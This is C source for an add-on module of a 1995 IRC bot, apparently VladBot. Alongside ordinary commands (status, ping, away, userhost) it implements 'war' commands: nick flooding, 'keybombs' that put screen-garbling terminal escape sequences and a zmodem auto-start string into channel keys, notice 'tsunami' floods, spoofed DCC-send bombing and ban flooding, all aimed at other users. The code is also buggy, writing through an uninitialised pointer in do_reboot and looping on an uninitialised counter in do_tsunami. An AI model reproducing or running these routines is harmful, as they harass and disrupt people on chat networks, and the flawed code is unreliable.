/*
 * vlad-ons2.c - the first one was over loaded
 * (c) 1995 OffSpring (cracker@cati.CSUFresno.EDU)
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <strings.h>
#include <ctype.h>
#include <sys/types.h>
#include <time.h>
#include <stdarg.h>

#include "channel.h"
#include "config.h"
#include "dcc.h"
#include "debug.h"
#include "ftext.h"
#include "ftp_dcc.h"
#include "misc.h"
#include "note.h"
#include "publics.h"
#include "send.h"
#include "session.h"
#include "userlist.h"
#include "vladbot.h"
#include "vlad-ons.h"
#include "vlad-ons2.h"
#include "war.h"

extern botinfo *currentbot;
extern int no_ops_flag;
extern int warflag;
extern int pubflag;
extern int logflag;
extern int singflag;
extern int bonkflag;
extern int greetingflag;

struct
{
	char *a;
} nick_flood[] =
{
  {"0"}, {"a"}, {"b"}, {"c"}, {"d"}, {"e"}, {"f"},
  {"g"}, {"h"}, {"i"}, {"j"}, {"k"}, {"l"}, {"m"},
  {"n"}, {"o"}, {"p"}, {"q"}, {"r"}, {"s"}, {"t"},
  {"u"}, {"v"}, {"w"}, {"x"}, {"y"}, {"z"}, 
  {"A"}, {"B"}, {"C"}, {"D"}, {"E"},
  {"F"}, {"G"}, {"H"}, {"I"}, {"J"}, 
  {"K"}, {"L"}, {"M"}, {"N"}, {"O"},
  {"P"}, {"Q"}, {"R"}, {"S"}, {"T"},  
  {"U"}, {"V"}, {"W"}, {"X"}, {"Y"},
  {"Z"}, {"1"}, {"2"}, {"3"}, {"4"},
  {"5"}, {"6"}, {"7"}, {"8"}, {"9"}
};
void do_nickflood(char *from, char *to, char *rest)
{
    int num, num_ = 0, tot = 0;
    int a,b,c,d,e,f,g,h,i;
    char the_nick[MAXLEN];
    char *oldnick=currentbot->nick;

    if(!rest || atoi(rest) < 1 )
    {
        send_to_user(from, "I need the number of times to change nicks.");
	return;
    }
    else
         num=atoi(rest);
    while ( nick_flood[tot].a )
	++tot;
    while ( num > num_ )
    {
      a = rand() % tot;
      b = rand() % tot;
      c = rand() % tot;
      d = rand() % tot;
      e = rand() % tot;
      f = rand() % tot;
      g = rand() % tot;
      h = rand() % tot;
      i = rand() % tot;

      sprintf(the_nick, "%s%s%s%s%s%s%s%s%s", nick_flood[a].a, nick_flood[b].a,
        nick_flood[c].a, nick_flood[d].a, nick_flood[e].a,
        nick_flood[f].a, nick_flood[g].a, nick_flood[h].a,
        nick_flood[i].a);
      sendnick(the_nick);
      ++num_;
    }
    send_to_server("NICK %s", oldnick);
}



void	do_keybomb(char *from, char *to, char *rest)
{
	char *name = get_token(&rest, " ");
	char *channel;

        if(name == NULL)
 	{
           send_to_user(from, "die ........ really fucks up the screen");
           send_to_user(from, "zmodem ..... auto init zmodem string");
           send_to_user(from, "fire ....... prints a flashing 'FIRE!'");
           send_to_user(from, "satan ...... prints a flashing 'S4T4N!!'");
           send_to_user(from, "Usage: keybomb <name> [channel]");
	   send_to_user(from, "To undo a keybomb, keybomb un<name>"); 
           return;
	}
	if((channel = get_token(&rest, " ")) == NULL)
		channel = currentchannel();
	if(STRCASEEQUAL(name, "die"))
		sendmode(channel, "+k \033#8\033[?3\\;5h\033\\(0");
	else if(STRCASEEQUAL(name, "undie"))
		sendmode(channel, "-k \033#8\033[?3\\;5h\033\\(0");
	else if(STRCASEEQUAL(name, "zmodem"))
		sendmode(channel, "+k **\024B00");
	else if(STRCASEEQUAL(name, "unzmodem"))
		sendmode(channel, "-k **\024B00");
	else if(STRCASEEQUAL(name, "fire"))
		sendmode(channel, "+k \033[41\\;5mFIRE!\033[m\033[7m");
	else if(STRCASEEQUAL(name, "unfire"))
		sendmode(channel, "-k \033[41\\;5mFIRE!\033[m\033[7m");
	else if(STRCASEEQUAL(name, "satan"))
		sendmode(channel, "+k \033[41\\;5m!!S4T4N!!\033[m\033[7m");
	else if(STRCASEEQUAL(name, "unsatan"))
		sendmode(channel, "-k \033[41\\;5m!!S4T4N!!\033[m\033[7m");
	else
	{
		send_to_user(from, "Invalid keybomb.");
		return;
	}
		send_to_user(from, "(un)Keybombed %s ..", channel);
}
void	do_bulletin(char *from, char *to, char *rest)
{

    FILE    *f;
    char    *s;   

  if(!rest)
  {
          f=fopen(BULLFILE, "r");
		while(s=get_ftext(f))
                send_to_user(from, s);
          fclose(f);
  }
  else
  {
	send_to_user(from, "Adding bulletin .. thanks .. :)");
	 f=fopen(BULLFILE, "a");
	 fprintf(f, "\n- %s\n- Added by %s\n", rest, getnick(from));
	 fclose(f);
  }
}

void	do_away(char *from, char *to, char *rest)
{
	if (!rest)
	{
		send_to_user(from, "No longer away ..");
		send_to_server("AWAY");
	}
	else
	{
		send_to_user(from, "Setting away message ..");
		send_to_server("AWAY :%s", rest);
	}
}


void    do_reboot(char *from, char *to, char *rest)
{
     char *whattodo;
     quit_all_bots(from, "Uhh .. huh huh .. Be right back ..");
     strcpy(whattodo, "bot");
     system("bot");
     exit(0);
}

void	do_tsunami(char *from, char *to, char *rest)
{
   int i;
   if (!rest)
   {
      sendreply("I need a nick to tsunami ..");
      return;
   }
   sendreply("Sending tsunami to %s ..", rest);
   while(i<5)
   {
     sendnotice(rest, "%s%s%s%s%s", TSU, TSU, TSU, TSU, TSU);
     i++;
   }
}

void	do_dccbomb(char *from, char *to, char *rest)
{
   if (!rest)
   {
     send_to_user(from, "I need a nick to DCC bomb ..");
     return;
   }
     send_to_user(from, "DCC Bombing %s ..", rest);
     send_ctcp(rest, "DCC SEND DCC trsiult9_1.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_2.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_3.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_4.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_5.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_6.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_7.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_8.zip 1435741 19 6667");
     send_ctcp(rest, "DCC SEND DCC trsiult9_9.zip 1435741 19 6667");
}

void	do_tsusignoff(char *from, char *to, char *rest)
{
	send_to_user(from, "This should be annoying .. :)");
	signoff( from, TSU );
}

void	do_tsuban(char *from, char *to, char *rest)
{
        char channel[255];
	int a = rand() % 99;
	int b = rand() % 99;
	int c = rand() % 99;
	int d = rand() % 99;
	int e = rand() % 99;

        if (rest && ischannel(rest))
          strcpy(channel, (rest));
        else if (!strcasecmp( currentbot->nick, to))
          strcpy(channel, currentchannel());
        else
          strcpy(channel, to);

	send_to_user(from, "TSU Banning %s ..", channel);
	sendmode(channel, "+b \002LAME\002!\022%i@%s%s", a, TSU, TSU);
	sendmode(channel, "+b \002BEEP\002!\022%i@%s%s", b, TSU, TSU);
	sendmode(channel, "+b \002EVIL\002!\022%i@%s%s", c, TSU, TSU);
	sendmode(channel, "+b \002DIE\002!\022%i@%s%s", d, TSU, TSU);
	sendmode(channel, "+b \002FLOOD\002!\022%i@%s%s", e, TSU, TSU);
}

void do_showidle(char *from, char *to, char *rest)
{
  char *chan;

  if( (chan = get_token(&rest, " ")) == NULL || !ischannel(chan))
  {
	sendreply("I need a channel name.");
	return;
  }
  if (!rest)
      rest = "0";
  show_idletimes(from, chan, atoi(rest));
}

int toggle(char *from, int *bleah, char *what, ...)
{
        char buf[MAXLEN];
        va_list msg;

        va_start(msg, what);
        vsprintf(buf, what, msg);
        va_end(msg);
        if (*bleah)
        {
                sendreply("%s now disabled", buf);
                *bleah = 0;
        }
        else
        {
                sendreply("%s now enabled", buf);
                *bleah = 1;
        }
}
int	stats(char *from, int *bleah, char *what, ...)
{
	char buf[MAXLEN];
	va_list	msg;

	va_start(msg, what);
	vsprintf(buf, what, msg);
	va_end(msg);
	if (*bleah)
		sendreply(" %20s | On", buf);
	else
		sendreply(" %20s | Off",buf);
}

void	do_status(char *from, char *to, char *rest)
{
  sendreply("Current Stats for %s", currentbot->nick);
  sendreply("-----------------------o-----");
  stats(from, &no_ops_flag, "Strict Oping");
  stats(from, &greetingflag, "Greetings");
  stats(from, &logflag, "Channel Logging");
  stats(from, &singflag, "Singing");
  stats(from, &bonkflag, "Bonking");
  stats(from, &warflag, "War Commands");
  sendreply("-----------------------o-----");
}
void	do_cool(char *from, char *to, char *rest)
{
  if(rest)
    sendreply("%s's userhost is %s", rest, getuserhost(rest));
}

void do_ping(char *from, char *to, char *rest)
{
   if (ischannel(to))
      sendprivmsg(to, "\002Pong\002");
   else
      sendreply("\002Pong\002");
}

void	do_getch(char *from, char *to, char *rest)
{
   sendreply("My current channel is: %s", currentchannel());
}

void	do_cmdchar(char *from, char *to, char *rest)
{
	if (!rest)
		sendreply("My command character is: %c", currentbot->cmdchar);
        else if (isalnum(*rest))
                sendreply("Invalid command character");
        else  
	{
        	currentbot->cmdchar = *rest;
                sendreply("My command character is now \"%c\"",
                        currentbot->cmdchar);
	}
	return;
}

void	do_userhost(from, to, rest)
char *from;
char *to;
char *rest;
{
        char *nick, *uh;

        if (!(nick = get_token(&rest, " ")))
        {
             sendreply("No nick specified");
             return;
        }

        uh = find_userhost(from, nick);
        if (!uh)
          return;
        sendreply("Possible userhost: %s", uh);
        return;
}
